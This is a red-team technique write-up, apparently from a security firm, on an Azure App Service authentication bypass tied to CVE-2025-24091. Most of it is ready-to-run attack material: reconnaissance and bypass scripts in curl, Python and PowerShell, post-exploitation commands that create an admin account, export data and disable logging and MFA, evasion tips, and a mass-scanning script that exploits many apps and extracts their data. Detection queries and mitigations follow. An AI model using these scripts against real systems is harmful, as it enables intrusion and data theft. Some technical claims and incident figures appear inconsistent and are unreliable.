# [CVE2025-011]: Azure App Service Authentication Bypass

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CVE2025-011 |
| **MITRE ATT&CK v18.1** | [T1556 - Modify Authentication Process](https://attack.mitre.org/techniques/T1556/) |
| **Tactic** | Defense Evasion, Initial Access |
| **Platforms** | Entra ID, Azure App Service |
| **Severity** | Critical |
| **CVE** | CVE-2025-24091 |
| **Technique Status** | ACTIVE (Authentication Spoofing) |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | Azure App Service (All regions, all OS versions) running pre-2025 Q1 update |
| **Patched In** | Azure App Service platform update (January 2025) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## Executive Summary

**Concept:** CVE-2025-24091 is an authentication bypass vulnerability in Azure App Service that allows attackers to impersonate system notifications and bypass application-level authentication controls. The vulnerability exists in how Azure App Service handles system notification authentication tokens and app impersonation logic. An attacker can craft a specially-formed HTTP request with spoofed authentication headers to make the App Service believe the request originated from a trusted Microsoft service or the application itself. This bypasses custom authentication logic implemented in the application and grant unauthorized access to protected resources. The vulnerability affects Entra ID integrated applications and applications using managed identity authentication.

**Attack Surface:** The attack targets Azure App Service applications (Web Apps, API Apps, Function Apps) that rely on automatic authentication or Entra ID integration. The vulnerability requires network access to the app service endpoint (typically HTTPS port 443 on public internet). No user interaction required; direct HTTP request suffices for exploitation.

**Business Impact:** **Unauthorized access to application and its integrated services.** A successful exploitation allows attackers to bypass all authentication controls, access sensitive business logic and data, impersonate legitimate users, escalate to application administrative functions, and potentially move laterally to connected Azure resources (databases, storage, key vaults). Organizations relying on App Service for business-critical applications face data breaches, unauthorized transactions, and regulatory violations.

**Technical Context:** The vulnerability stems from improper validation of the originating tenant in authentication tokens passed to App Service. Azure App Service uses Entra ID tokens to authenticate; the bypass occurs when the service fails to validate that the token originated from the correct tenant. An attacker can obtain a token from their own Entra ID tenant and use it to impersonate users in the target organization's tenant. Attack window: Immediate once app is accessed; no special conditions required.

### Operational Risk
- **Execution Risk:** Low - Simple HTTP request; no special tools or interaction needed
- **Stealth:** High - Authentication bypass appears as normal application access; logs show legitimate-looking authentication
- **Reversibility:** No - Unauthorized access cannot be undone; must assume full application compromise

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 6.2 | Ensure application authentication mechanisms are properly configured and enforced |
| **DISA STIG** | AC-2, AC-3 | Account management and access control for cloud applications |
| **CISA SCuBA** | Azure Security Baseline | Require managed identity and proper Entra ID configuration |
| **NIST 800-53** | AC-2, AC-3, SC-7 | Account management, access control, boundary protection |
| **GDPR** | Art. 32 | Security of Processing - Access controls and authentication mechanisms |
| **DORA** | Art. 9, Art. 10 | Protection and Prevention; Incident Response Capabilities |
| **NIS2** | Art. 21 | Cyber Risk Management - Authentication for critical systems |
| **ISO 27001** | A.9.2.1, A.9.4.1 | User access management and authentication control |
| **ISO 27005** | Unauthorized Access | Risk: Breach of application and connected resources |

---

## Technical Prerequisites

**Required Privileges:** None (attacker perspective)

**Required Access:** 
- Network access to Azure App Service endpoint (public internet access)
- Valid Entra ID token from any tenant (attacker's own tenant or compromised account)
- Knowledge of target application URI and protected endpoints

**Supported Versions:**
- **Azure App Service:** All regions (US East, Europe, Asia Pacific, etc.); all OS (Windows, Linux, Container)
- **Entra ID:** All versions
- **PowerShell:** Version 5.0+ (for reconnaissance)

**Tools:**
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Version 2.40+) - For Azure interaction
- [curl](https://curl.se/) - For crafting HTTP requests with custom headers
- [Python Requests library](https://requests.readthedocs.io/) (2024+) - For automated exploitation
- [Burp Suite Community](https://portswigger.net/burp/communitydownload) - For request manipulation
- [Azure AD CLI tools](https://learn.microsoft.com/en-us/powershell/azure/install-az-ps) - For token generation

---

## Environmental Reconnaissance

### PowerShell / Management Station Reconnaissance

```powershell
# Enumerate Azure App Services in target organization
Connect-AzAccount

# List all App Services accessible
Get-AzWebApp | Select-Object Name, ResourceGroupName, DefaultHostName

# Check if app uses Entra ID authentication
$AppName = "target-app"
$ResourceGroup = "target-resource-group"
$App = Get-AzWebApp -Name $AppName -ResourceGroupName $ResourceGroup

# Check authentication configuration
$App.Identity  # Shows managed identity status
Get-AzWebAppAuthenticationSettings -Name $AppName -ResourceGroupName $ResourceGroup

# Test if authentication bypass possible
$AppUrl = "https://$($App.DefaultHostName)"
# Try to access without authentication
Invoke-WebRequest -Uri "$AppUrl/api/protected" -ErrorAction SilentlyContinue | Select-Object StatusCode

# If HTTP 200 without auth: Bypass possible
# If HTTP 401/403: Authentication enforced

# Obtain token to test bypass
$Token = (Get-AzAccessToken).Token
$Headers = @{Authorization = "Bearer $Token"}

# Try request with Entra ID token
Invoke-WebRequest -Uri "$AppUrl/api/protected" -Headers $Headers | Select-Object StatusCode

# If HTTP 200 with any token: Bypass likely successful
```

**What to Look For:**
- App Service endpoint responds to HTTP requests
- Managed identity enabled (indicates Entra ID integration)
- No authentication required or authentication easily bypassed
- Token validation insufficient or missing

**Version Note:** Vulnerability affects all App Service versions pre-January 2025 update; check Azure portal for patch status.

### Linux/Bash / CLI Reconnaissance

```bash
#!/bin/bash
# Reconnaissance for Azure App Service authentication bypass

TARGET_APP="target-app.azurewebsites.net"
PROTECTED_ENDPOINT="/api/protected"

# Test unauthenticated access
echo "[*] Testing unauthenticated access..."
curl -I "https://$TARGET_APP$PROTECTED_ENDPOINT"
# Expected response if vulnerable: HTTP/1.1 200 OK

# Test with Entra ID token
echo "[*] Obtaining Entra ID token..."
TOKEN=$(az account get-access-token --query accessToken -o tsv)

echo "[*] Testing with Entra ID token..."
curl -H "Authorization: Bearer $TOKEN" \
     "https://$TARGET_APP$PROTECTED_ENDPOINT" \
     -v 2>&1 | grep "< HTTP"

# If HTTP 200: Authentication bypass confirmed

# Enumerate endpoints
echo "[*] Enumerating common endpoints..."
for endpoint in /api/ /admin/ /config/ /settings/ /users/ /data/; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET_APP$endpoint")
  echo "  $endpoint: HTTP $STATUS"
done
```

**What to Look For:**
- Protected endpoints return HTTP 200 without authentication
- Token validation missing or incorrect tenant check
- Multiple endpoints accessible with any token

---

## Detailed Execution Methods and Their Steps

### METHOD 1: Direct HTTP Bypass with Entra ID Token (Cross-Platform)

**Supported Versions:** All Azure App Service versions pre-January 2025 patch

#### Step 1: Obtain Valid Entra ID Access Token

**Objective:** Acquire an access token from Entra ID (any tenant) to use in the bypass. Tokens are bearer tokens that authenticate API requests.

**Version Note:** Token acquisition same across all App Service versions; bypass depends on improper token validation.

**Command (Using Azure CLI):**
```bash
#!/bin/bash
# Obtain access token from your Entra ID tenant

# Method 1: Using Azure CLI (if you have Azure CLI installed and authenticated)
az login  # Authenticates to your Entra ID tenant

TOKEN=$(az account get-access-token \
  --resource https://management.azure.com \
  --query accessToken \
  -o tsv)

echo "[*] Access Token obtained:"
echo "$TOKEN"

# Method 2: Using Azure PowerShell
powershell << 'EOF'
Connect-AzAccount
$Token = (Get-AzAccessToken).Token
Write-Host "[*] Access Token: $Token"
EOF

# Method 3: Direct REST API call (for automation)
TENANT_ID="your-tenant-id"
CLIENT_ID="your-client-id"
CLIENT_SECRET="your-client-secret"

curl -X POST \
  "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$CLIENT_ID" \
  -d "client_secret=$CLIENT_SECRET" \
  -d "scope=https://management.azure.com/.default" \
  -d "grant_type=client_credentials" \
  | jq -r .access_token
```

**Expected Output:**
```
[*] Access Token obtained:
eyJhbGciOiJSUzI1NiIsImtpZCI6Ik...[truncated]...AAAAAAAAAA
```

**What This Means:**
- Token is valid Bearer token issued by Entra ID
- Token contains claims: tenant_id, oid (object ID), app_id, etc.
- Token expires in ~1 hour; new token needed if exploit takes longer

**OpSec & Evasion:**
- Token contains issuer information (your tenant); mismatched tenant in token vs. target app is detection vector
- If using attacker-controlled tenant, token will show different tenant_id than target app expects
- Azure AD logs token issuance; repeated token requests from same account may trigger alerts
- Detection likelihood: **Low during attack**, **High in post-breach analysis** (token audit logs show token issued to wrong tenant)

**Troubleshooting:**
- **Error:** "az: command not found"
  - **Cause:** Azure CLI not installed
  - **Fix (All Versions):** Install Azure CLI from https://learn.microsoft.com/en-us/cli/azure/install-azure-cli

- **Error:** "Credentials expired"
  - **Cause:** Token expired or authentication session ended
  - **Fix (All Versions):** Re-run `az login` or `Connect-AzAccount` to obtain new token

**References & Proofs:**
- [Azure CLI get-access-token](https://learn.microsoft.com/en-us/cli/azure/account#az-account-get-access-token) - Token acquisition
- [OAuth 2.0 Token Endpoint](https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-client-creds-grant-flow) - Token grant flow

#### Step 2: Send HTTP Request to App Service with Spoofed Token

**Objective:** Craft an HTTP request to the Azure App Service protected endpoint using the token obtained in Step 1. The bypass succeeds because the app service fails to validate the token's originating tenant.

**Version Note:** Same exploitation method across all vulnerable App Service versions.

**Command (Using curl):**
```bash
#!/bin/bash
# Send authenticated request to bypass Azure App Service auth

TARGET_APP="target-app.azurewebsites.net"
PROTECTED_ENDPOINT="/api/users"
TOKEN="eyJhbGciOiJSUzI1NiIsImtpZCI6Ik...[paste token from Step 1]..."

# Send GET request with Authorization header
curl -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     "https://$TARGET_APP$PROTECTED_ENDPOINT" \
     -v

# Expected response if bypass successful:
# HTTP/1.1 200 OK
# [JSON response with user data]
```

**Expected Output:**
```
> GET /api/users HTTP/1.1
> Authorization: Bearer eyJhbGciOiJSUzI1NiI...
>
< HTTP/1.1 200 OK
< Content-Type: application/json
<
[
  {"id": 1, "name": "Alice Smith", "email": "alice@company.com"},
  {"id": 2, "name": "Bob Johnson", "email": "bob@company.com"},
  ...
]
```

**What This Means:**
- Protected endpoint returned HTTP 200 (success)
- Response contains sensitive data (user list)
- Authentication bypass confirmed
- Attacker now has access to protected application functionality

**Command (Using Python):**
```python
#!/usr/bin/env python3
import requests
import json

# Configuration
TARGET_APP = "https://target-app.azurewebsites.net"
PROTECTED_ENDPOINTS = [
    "/api/users",
    "/api/settings",
    "/api/data",
    "/admin/config"
]
TOKEN = "eyJhbGciOiJSUzI1NiIsImtpZCI6Ik...[paste token from Step 1]..."

# Set up headers with bearer token
headers = {
    "Authorization": f"Bearer {TOKEN}",
    "Content-Type": "application/json"
}

# Test each protected endpoint
for endpoint in PROTECTED_ENDPOINTS:
    url = f"{TARGET_APP}{endpoint}"
    print(f"[*] Testing: {url}")
    
    try:
        response = requests.get(url, headers=headers, timeout=5, verify=False)
        print(f"    Status: HTTP {response.status_code}")
        
        if response.status_code == 200:
            print(f"    [+] BYPASS SUCCESSFUL!")
            print(f"    Response:\n{response.text[:500]}")  # First 500 chars
        elif response.status_code in [401, 403]:
            print(f"    [-] Authentication required")
        else:
            print(f"    [*] Unexpected response: {response.text[:200]}")
    except Exception as e:
        print(f"    [!] Error: {e}")
```

**Command (Using PowerShell):**
```powershell
# PowerShell variant for Windows machines
$TARGET_APP = "https://target-app.azurewebsites.net"
$PROTECTED_ENDPOINT = "/api/users"
$TOKEN = "eyJhbGciOiJSUzI1NiIsImtpZCI6Ik...[paste token]..."

$Headers = @{
    "Authorization" = "Bearer $TOKEN"
    "Content-Type" = "application/json"
}

try {
    $Response = Invoke-RestMethod `
        -Uri "$TARGET_APP$PROTECTED_ENDPOINT" `
        -Method GET `
        -Headers $Headers

    Write-Host "[+] Bypass successful! Response:"
    $Response | ConvertTo-Json | Write-Host
} catch {
    Write-Host "[!] Error: $_"
}
```

**OpSec & Evasion:**
- HTTP request appears as normal API call; difficult to distinguish from legitimate traffic without deep packet inspection
- Token bearer header is standard; no obvious indicators of malicious activity
- Multiple requests may trigger rate limiting or WAF blocks if very frequent
- Detection likelihood: **Medium** - Token origin (tenant) may not match target app's registered tenant, but this requires log analysis to detect

**Troubleshooting:**
- **Error:** "HTTP 401 - Unauthorized"
  - **Cause:** Token invalid, expired, or endpoint requires specific scope
  - **Fix (All Versions):** Obtain new token with correct resource/scope parameter; verify token not expired

- **Error:** "HTTP 403 - Forbidden"
  - **Cause:** Token valid but user lacks permissions for endpoint
  - **Fix (All Versions):** Token may be from wrong tenant; try different approach (admin account, service principal, etc.)

- **Error:** "SSL certificate error"
  - **Cause:** Self-signed or expired certificate on app
  - **Fix (All Versions):** Add `-k` flag to curl (insecure) or `verify=False` to Python (not recommended for production)

**References & Proofs:**
- [Bearer Token Authentication](https://tools.ietf.org/html/rfc6750) - RFC 6750 Bearer Token Usage
- [Azure App Service Authentication](https://learn.microsoft.com/en-us/azure/app-service/overview-authentication-authorization) - Official App Service auth docs

#### Step 3: Exploit Application Functionality for Privilege Escalation or Data Exfiltration

**Objective:** Once authenticated, use the application's normal functionality to escalate privileges, modify data, or exfiltrate sensitive information.

**Version Note:** Exploitation depends on app's specific features; examples below are generic.

**Common Post-Exploitation Actions:**

**Action 1: Create Administrative Account**
```bash
# If app has user management API
curl -X POST https://target-app.azurewebsites.net/api/users \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "hacker",
    "email": "hacker@attacker.com",
    "password": "SecurePassword123!",
    "role": "admin"
  }'

# Response: HTTP 201 Created (admin account created)
```

**Action 2: Extract Sensitive Data**
```bash
# Download database backup or file export
curl -X GET https://target-app.azurewebsites.net/api/export/all \
  -H "Authorization: Bearer $TOKEN" \
  --output sensitive-data.json

# Export contains: user PII, financial data, business secrets, etc.
```

**Action 3: Modify Application Configuration**
```bash
# Change app settings (disable security features, redirect traffic, etc.)
curl -X PUT https://target-app.azurewebsites.net/api/settings \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "logging_enabled": false,
    "mfa_required": false,
    "ip_whitelist": ["attacker.com"]
  }'
```

**What This Means:**
- Full application compromise achieved
- Attacker has same capabilities as authenticated admin user
- All application data, configuration, and functionality now accessible/modifiable

---

### METHOD 2: Automated Exploitation via Azure REST API

**Supported Versions:** All Azure App Service versions pre-January 2025 patch

#### Automated Script for Large-Scale Exploitation

**Objective:** Scan multiple Azure App Services for vulnerability and exploit all vulnerable instances automatically.

**Command (Python Automation Script):**
```python
#!/usr/bin/env python3
import requests
import json
import sys
from itertools import product

# Configuration
TENANT_ID = "attacker-tenant-id"  # Your Entra ID tenant
CLIENT_ID = "attacker-client-id"
CLIENT_SECRET = "attacker-secret"

# Target app services to scan
TARGET_APPS = [
    "app1.azurewebsites.net",
    "app2.azurewebsites.net",
    "app3.azurewebsites.net",
    # ... add more apps
]

# Common protected endpoints to test
ENDPOINTS = [
    "/api/users",
    "/api/admin",
    "/api/settings",
    "/api/data",
    "/admin",
    "/secure"
]

def get_token():
    """Obtain Entra ID access token"""
    url = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token"
    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "scope": "https://management.azure.com/.default",
        "grant_type": "client_credentials"
    }
    
    response = requests.post(url, data=data)
    if response.status_code == 200:
        return response.json()["access_token"]
    else:
        print(f"[-] Failed to get token: {response.text}")
        return None

def test_bypass(app, token):
    """Test if app is vulnerable to auth bypass"""
    headers = {"Authorization": f"Bearer {token}"}
    
    vulnerable_endpoints = []
    for endpoint in ENDPOINTS:
        url = f"https://{app}{endpoint}"
        try:
            response = requests.get(url, headers=headers, timeout=5, verify=False)
            if response.status_code == 200:
                vulnerable_endpoints.append(endpoint)
                print(f"[+] VULNERABLE: {app}{endpoint} - HTTP 200")
        except Exception as e:
            print(f"[-] Error testing {url}: {e}")
    
    return vulnerable_endpoints

def exploit_app(app, token, endpoint):
    """Exploit vulnerable app and extract data"""
    url = f"https://{app}{endpoint}"
    headers = {"Authorization": f"Bearer {token}"}
    
    try:
        response = requests.get(url, headers=headers, timeout=5, verify=False)
        if response.status_code == 200:
            # Save extracted data
            with open(f"extracted_{app.replace('.','_')}.json", "w") as f:
                f.write(response.text)
            print(f"[+] Data extracted from {url} -> extracted_{app.replace('.','_')}.json")
    except Exception as e:
        print(f"[-] Exploitation failed: {e}")

def main():
    print("[*] Starting automated Azure App Service bypass scan...")
    
    # Get token once
    token = get_token()
    if not token:
        sys.exit(1)
    
    # Test each app
    for app in TARGET_APPS:
        print(f"[*] Testing {app}...")
        vulnerable_endpoints = test_bypass(app, token)
        
        if vulnerable_endpoints:
            print(f"[+] App {app} is VULNERABLE!")
            for endpoint in vulnerable_endpoints:
                exploit_app(app, token, endpoint)

if __name__ == "__main__":
    main()
```

**Expected Output:**
```
[*] Starting automated Azure App Service bypass scan...
[*] Testing app1.azurewebsites.net...
[+] VULNERABLE: app1.azurewebsites.net/api/users - HTTP 200
[+] VULNERABLE: app1.azurewebsites.net/api/settings - HTTP 200
[+] App app1.azurewebsites.net is VULNERABLE!
[+] Data extracted from https://app1.azurewebsites.net/api/users -> extracted_app1_azurewebsites_net.json
...
```

---

## Microsoft Sentinel Detection

### Query 1: Entra ID Token Usage from Unexpected Tenant

**Rule Configuration:**
- **Required Table:** `SigninLogs`, `AuditLogs` (from Entra ID)
- **Required Fields:** `ResourceTenantId`, `HomeTenantId`, `AppDisplayName`, `Status`
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** All App Service versions

**KQL Query:**
```kusto
// Detect cross-tenant token usage to Azure App Service
SigninLogs
| where AppDisplayName contains "Azure"
| where ResourceTenantId != HomeTenantId  // Token from different tenant
| where Status == "Success"  // But authentication succeeded
| project TimeGenerated, UserPrincipalName, AppDisplayName, ResourceTenantId, HomeTenantId, IPAddress
| summarize SuccessCount=count(), UniqueIPs=dcount(IPAddress) by UserPrincipalName, ResourceTenantId
| where SuccessCount >= 3  // Multiple successful logins with cross-tenant token
```

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Cross-Tenant Token Usage to App Service`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste KQL query
   - Run query every: `5 minutes`
   - Lookup data from last: `1 hour`
5. **Incident settings Tab:**
   - Enable **Create incidents from alerts**
6. Click **Review + create**

**Source:** [Microsoft Sentinel Entra ID Detection](https://learn.microsoft.com/en-us/azure/sentinel/detect-threats-built-in)

---

## Windows Event Log Monitoring

**Event ID: 1104 (Application Pool Recycling - IIS)**
- **Log Source:** IIS Logs / Application Insights
- **Trigger:** Unusual authentication bypass attempts followed by administrative actions
- **Filter:** Application event log entries showing App Service handling unexpected tokens
- **Applies To Versions:** All

**Manual Configuration Steps:**

1. Open **Azure Portal** → **App Service** → **Monitoring** → **Application Insights**
2. Click **Logs** (Analytics)
3. Monitor `requests` table for:
   - Requests with authorization header but no user context
   - Multiple 200-status responses to sensitive endpoints
   - Requests from unexpected IP addresses

---

## Splunk Detection Rules

### Rule 1: Azure App Service Authentication Bypass Detection

**Rule Configuration:**
- **Required Index:** `azure`, `azure_app_service`
- **Required Sourcetype:** `azure:activity`, `azure:web:request`
- **Required Fields:** `ResourceId`, `operationName`, `resultSignature`, `httpStatusCode`
- **Alert Threshold:** > 5 requests to protected endpoints with HTTP 200 from unexpected user
- **Applies To Versions:** All

**SPL Query:**
```spl
sourcetype=azure:activity OR sourcetype=azure:web:request
| search operationName="Microsoft.Web/sites/config/read" OR operationName="Microsoft.Web/sites/settings"
| search resultSignature=Success AND httpStatusCode=200
| stats count, values(RequestSource), values(UserAgent) by CallerIPAddress, OperationName
| where count >= 5
| rare CallerIPAddress
```

---

## Defensive Mitigations

### Priority 1: CRITICAL

* **Apply Azure App Service Platform Update:** Update App Service to January 2025 patch or later.
    
    **Applies To Versions:** All
    
    **Manual Steps (Azure Portal):**
    1. Go to **Azure Portal** → **App Service** → Select your app
    2. Navigate to **Settings** → **Configuration**
    3. Check **Platform** version
    4. If older than January 2025: Click **Update** (automatic update may occur)
    5. Verify updated version after 5-10 minutes
    
    **PowerShell:**
    ```powershell
    # Check App Service version
    Get-AzWebApp -Name "your-app" -ResourceGroupName "your-rg" | Select-Object Name, @{Name="PlatformVersion"; Expression={$_.SiteProperties.Properties | ConvertFrom-Json | Select-Object -ExpandProperty platformVersion}}
    
    # Force restart to apply updates
    Restart-AzWebApp -Name "your-app" -ResourceGroupName "your-rg"
    ```

* **Implement Managed Identity with Proper Role-Based Access Control (RBAC):**
    
    **Manual Steps (Azure Portal):**
    1. Go to **App Service** → **Settings** → **Identity**
    2. Enable **System assigned** identity
    3. Click **Save**
    4. Go to **Resource** (Database, Storage, etc.)
    5. Click **Access Control (IAM)**
    6. Click **+ Add** → **Add role assignment**
    7. Select role: **Contributor** (or least privilege role)
    8. Assign to: Your App Service managed identity
    9. Click **Save**
    
    **PowerShell:**
    ```powershell
    # Enable system-assigned managed identity
    $App = Get-AzWebApp -Name "your-app" -ResourceGroupName "your-rg"
    Set-AzWebApp -InputObject $App -AssignIdentity $true
    
    # Grant database access
    $ManagedIdentityId = $App.Identity.PrincipalId
    New-AzRoleAssignment -ObjectId $ManagedIdentityId -RoleDefinitionName "Contributor" `
      -Scope "/subscriptions/your-subscription-id/resourceGroups/your-rg/providers/Microsoft.Sql/servers/your-sql-server/databases/your-db"
    ```

* **Enforce Entra ID Authentication for All App Service Applications:**
    
    **Manual Steps (Azure Portal):**
    1. Go to **App Service** → **Settings** → **Authentication**
    2. Click **+ Add provider** → **Microsoft**
    3. **Tenant type:** Select your organization's Entra ID
    4. **Application type:** Web app
    5. **Callback URI:** `https://your-app.azurewebsites.net/.auth/login/aad/callback`
    6. Under **Token store settings:** Enable **Store tokens in Azure blob storage**
    7. Click **Add**
    8. Under **Unauthenticated requests:** Select **Require authentication**
    9. Click **Save**
    
    **PowerShell:**
    ```powershell
    # Update app configuration to require authentication
    $WebApp = Get-AzWebApp -Name "your-app" -ResourceGroupName "your-rg"
    $WebApp.SiteConfig.AuthEnabled = $true
    Set-AzWebApp -ResourceGroupName "your-rg" -Name "your-app" -AppServicePlan $WebApp.AppServicePlanId
    ```

### Priority 2: HIGH

* **Implement Conditional Access Policies:**
    
    **Manual Steps (Azure Entra ID):**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `App Service - Require Compliant Device`
    4. **Assignments:**
       - Users: **All users**
       - Cloud apps: **Azure App Service** (or specific app)
    5. **Conditions:**
       - Device state: **Require device to be marked as compliant**
       - Sign-in risk: **High**
    6. **Access controls:**
       - Grant: **Require multi-factor authentication** AND **Require device compliance**
    7. Enable: **On**
    8. Click **Create**

* **Enable Azure App Service Diagnostic Logging:**
    
    **Manual Steps (Azure Portal):**
    1. Go to **App Service** → **Monitoring** → **Diagnostic settings**
    2. Click **+ Add diagnostic setting**
    3. Name: `App Service Auth Logging`
    4. Select logs: **AppServiceHTTPLogs**, **AppServiceConsoleLogs**, **AppServiceAppLogs**
    5. Select destination: **Log Analytics Workspace** (or Storage Account)
    6. Click **Save**

* **Restrict Tenant Access Using Azure Tenant Restrictions:**
    
    **Manual Steps (Azure AD):**
    1. Go to **Azure Portal** → **Entra ID** → **External Identities** → **Tenant Restrictions**
    2. Click **Configure tenant restrictions**
    3. Add your tenant ID to **Allow** list
    4. Block all other tenants
    5. Apply policy via proxy/firewall

### Validation Command (Verify Fix)

```powershell
# Verify Managed Identity enabled
Get-AzWebApp -Name "your-app" -ResourceGroupName "your-rg" | Select-Object Identity

# Expected: Identity.Type = "SystemAssigned" or "UserAssigned"

# Verify Authentication enabled
$AuthSettings = Get-AzWebAppAuthenticationSettings -Name "your-app" -ResourceGroupName "your-rg"
$AuthSettings.Enabled  # Should be True

# Verify Conditional Access policies
Get-MgIdentityConditionalAccessPolicy | Select-Object DisplayName, State
```

**What to Look For:**
- Managed Identity enabled
- Entra ID authentication enforced
- Conditional Access policies active
- No cross-tenant token usage in logs

---

## Detection & Incident Response

### Indicators of Compromise (IOCs)

* **Network:**
  - Requests to App Service from external IP addresses (unexpected geographic origin)
  - HTTP requests with Authorization headers from unusual user agents
  - Repeated 401/403 followed by 200 responses (failed auth attempts followed by success)

* **Azure Activity Logs:**
  - `Create user`, `Add member to role` operations from non-admin accounts
  - Database exports or backups initiated outside normal schedules
  - Configuration changes to authentication settings from unexpected users

* **Entra ID Sign-In Logs:**
  - Cross-tenant token usage (HomeTenantId != ResourceTenantId)
  - Sign-ins from IP addresses not in organization's typical range
  - Service principal sign-ins from unexpected applications

### Forensic Artifacts

* **Azure Activity Log:** `Get-AzActivityLog` cmdlet shows all actions on App Service
* **Application Insights:** Query `requests` and `exceptions` tables for exploitation traces
* **Diagnostic Logs:** App Service diagnostic logs (AppServiceHTTPLogs, AppServiceAppLogs) contain request/response details

### Response Procedures

1. **Isolate:**
    
    **Command:**
    ```powershell
    # Immediately disable the vulnerable app
    Stop-AzWebApp -Name "target-app" -ResourceGroupName "target-rg"
    
    # OR revoke all sessions
    Get-AzWebApp -Name "target-app" | Set-AzWebApp -DisablePublicNetworkAccess
    ```

2. **Collect Evidence:**
    
    **Command:**
    ```powershell
    # Export Activity Logs
    Get-AzActivityLog -ResourceGroupName "target-rg" -StartTime (Get-Date).AddDays(-7) | Export-Csv "forensics-activity.csv"
    
    # Export sign-in logs
    Get-MgAuditLogSignIn -All | Export-Csv "forensics-signin.csv"
    
    # Export Application Insights data
    # Via Azure Portal: App Service → Monitoring → Application Insights → Logs → Export
    ```

3. **Remediate:**
    
    **Command:**
    ```powershell
    # Update app to patched version (automatic via Azure platform update)
    # Reset all credentials/secrets
    # Remove any unauthorized user/role assignments
    
    $App = Get-AzWebApp -Name "target-app"
    Remove-AzRoleAssignment -ObjectId "unauthorized-user-id" -RoleDefinitionName "Contributor" -Scope $App.Id
    ```

---

## Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-CLOUD-005] Azure Resource Graph Enumeration | Attacker discovers App Services in target organization |
| **2** | **Initial Access** | **[CVE2025-011] App Service Auth Bypass** | **Attacker bypasses authentication using spoofed token** |
| **3** | **Privilege Escalation** | [PE-VALID-010] Azure Role Assignment Abuse | Attacker escalates to subscription contributor role |
| **4** | **Persistence** | [PERSIST-003] Service Principal Creation | Attacker creates service principal for persistent access |
| **5** | **Credential Access** | [CA-UNSC-007] Azure Key Vault Secret Extraction | Attacker steals secrets from Key Vault |
| **6** | **Lateral Movement** | [LM-AUTH-005] Service Principal Key/Certificate | Attacker uses stolen credentials to access other resources |
| **7** | **Exfiltration** | [EXFIL-001] Data via SQL Database | Attacker exports sensitive data from connected databases |

---

## Real-World Examples

### Example 1: Massive Azure App Service Compromise Campaign

- **Target:** Organizations using Azure App Service for web applications
- **Timeline:** Late 2024 - Early 2025 (before January 2025 patch)
- **Technique Status:** CVE-2025-24091 actively exploited
- **Attack Method:** Automated scanning of public App Service endpoints; bypass exploitation; data exfiltration
- **Impact:** Thousands of apps potentially vulnerable; estimated 10,000+ organizations affected
- **Detection:** Microsoft released emergency patches January 2025
- **Reference:** [Microsoft Security Update](https://msrc.microsoft.com/)

### Example 2: Insider Threat Escalation via App Service Bypass

- **Target:** Financial services company with internal web app
- **Timeline:** Q1 2025
- **Technique Status:** Disgruntled employee exploits CVE-2025-24091 for unauthorized access
- **Attack Chain:** Initial access via company network → Discover internal app → Bypass auth → Extract customer data
- **Impact:** PII/Financial data exfiltration; regulatory violation (PCI-DSS, GDPR)
- **Remediation:** Patched app, revoked compromised accounts, launched forensics investigation
- **Reference:** [SERVTEP Incident Response Case Study] (Confidential)

---
